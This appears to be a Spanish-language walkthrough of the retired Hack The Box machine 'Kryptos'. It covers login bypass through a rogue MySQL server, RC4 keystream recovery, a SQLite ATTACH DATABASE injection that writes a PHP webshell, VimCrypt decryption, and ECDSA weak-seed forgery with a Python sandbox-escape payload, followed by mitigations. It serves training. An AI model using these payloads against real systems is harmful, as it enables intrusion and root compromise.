---
machine: Kryptos
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, php, sqli, mysql, rc4, vimcrypt, sqlite, webshell, ecdsa, weak-rng, privesc]
---

# Kryptos — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El login de Kryptos permite elegir el cifrado y el servidor de base de datos. Cambiando `db=cryptor` por una cadena con `host` y `port` propios, la aplicación se conecta a un MySQL controlado y se falsea la autenticación. Con RC4 y texto plano conocido se deriva el keystream y se descifra la página `/dev/`, que contiene una prueba de SQLite inyectable. La inyección escribe un webshell PHP y da acceso al sistema, donde `creds.txt` está cifrado con VimCrypt. El descifrado revela la contraseña de SSH de `rijndael`. En localhost, el puerto `81` expone `/eval`, que firma expresiones con ECDSA y un generador débil; tras recuperar la semilla se firma código arbitrario y se ejecuta como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22`: OpenSSH.
- `80`: Apache con la aplicación PHP "Kryptos".

```bash
echo '<IP> kryptos.htb' | sudo tee -a /etc/hosts
gobuster dir -u http://kryptos.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## Enumeración

La página principal tiene un formulario de login con un selector de cifrado (`AES`/`RC4`) y un parámetro `db` que el servidor usa para conectarse a MySQL. También existe `/encrypt.php`, que descarga una URL y la devuelve cifrada.

## Foothold

Se levanta un MySQL propio y se cambia el parámetro:

```text
db=cryptor;host=<LHOST>;port=3306;
```

La aplicación se conecta al servidor falso; respondiendo a la consulta de autenticación con una fila válida se entra sin credenciales.

Con RC4, el keystream es constante para la misma clave. Se pide al servidor que cifre una página cuyo contenido se conoce (`index.php`) y se hace XOR entre texto plano y ciphertext para obtener el keystream. Luego se descifra `/dev/`, una página de pruebas con SQLite.

La inyección SQLite permite escribir un archivo PHP dentro del directorio web mediante `ATTACH DATABASE`:

```sql
ATTACH DATABASE '/var/www/html/<SHELL>.php' AS p;
CREATE TABLE p.x (c TEXT);
INSERT INTO p.x VALUES ('<?php system($_GET["cmd"]); ?>');
```

Con el webshell se enumeran `/home/rijndael`. `creds.old` contiene `rijndael / Password1`, una contraseña antigua que ya no funciona, y `creds.txt` empieza por `VimCrypt~02!`.

## Movimiento lateral

VimCrypt~02 reutiliza el mismo IV en los primeros bloques. Como el archivo empieza por `rijndael /`, se hace XOR de esos 8 bytes conocidos con el primer bloque para obtener el keystream y se descifra el resto:

```bash
./decrypt_vimcrypt.py creds.txt rijndael
```

El resultado es la contraseña de `rijndael`, que funciona por SSH.

## Escalada de privilegios

`rijndael` puede crear un túnel al puerto `81` local:

```bash
ssh -L 81:localhost:81 rijndael@kryptos.htb
```

La API tiene dos rutas:

- `/debug`: devuelve una expresión (`2+2`) y su firma ECDSA.
- `/eval`: valida la firma y ejecuta el resultado de `eval`.

La firma usa un generador pseudoaleatorio con una semilla débil. Se prueban las 209 semillas posibles hasta encontrar la que reproduce la firma de `/debug`; con ella se firma cualquier expresión. Los `builtins` están eliminados del entorno de `eval`, pero se recuperan mediante la cadena de subclases de Python:

```python
[c for c in ().__class__.__base__.__subclasses__()
 if c.__name__ == "catch_warnings"][0]._module.__builtins__.get('__import__')('os').system("<CMD>")
```

Al enviar la expresión firmada a `/eval` se ejecuta como root.

## Evidencia

- Login falseado con un MySQL propio y el parámetro `db`.
- Keystream RC4 derivado y página `/dev/` descifrada.
- Inyección SQLite y webshell PHP.
- `creds.txt` con VimCrypt y contraseña de `rijndael`.
- `/debug` con firma ECDSA y semilla recuperada.
- Expresión firmada ejecutada por `/eval` como root.

## Lecciones aprendidas

- Un parámetro que construye la conexión a la base de datos permite apuntar a un servidor propio.
- RC4 con clave fija reutiliza el keystream y cae ante texto plano conocido.
- SQLite permite escribir archivos con `ATTACH DATABASE`.
- Los backups cifrados con VimCrypt son recuperables si se conoce parte del contenido.
- Un generador aleatorio débil invalida por completo una firma ECDSA.
- `eval` sigue siendo peligroso aunque se eliminen los `builtins`.

## Mitigaciones y detección

- No permitir que el cliente elija host o credenciales de base de datos.
- Sustituir RC4 por cifrado autenticado (AES-GCM) y no reutilizar claves.
- Restringir `ATTACH DATABASE` y los permisos de escritura del usuario de SQLite.
- No guardar credenciales en backups cifrados con herramientas débiles.
- Usar un CSPRNG para las firmas y rotar claves.
- Evitar `eval`; si es imprescindible, aislarlo y auditar las expresiones.

## Referencias

- [0xdf — Kryptos](https://0xdf.gitlab.io/2019/09/21/htb-kryptos.html)
- [Hack The Box — Kryptos](https://app.hackthebox.com/machines/kryptos)
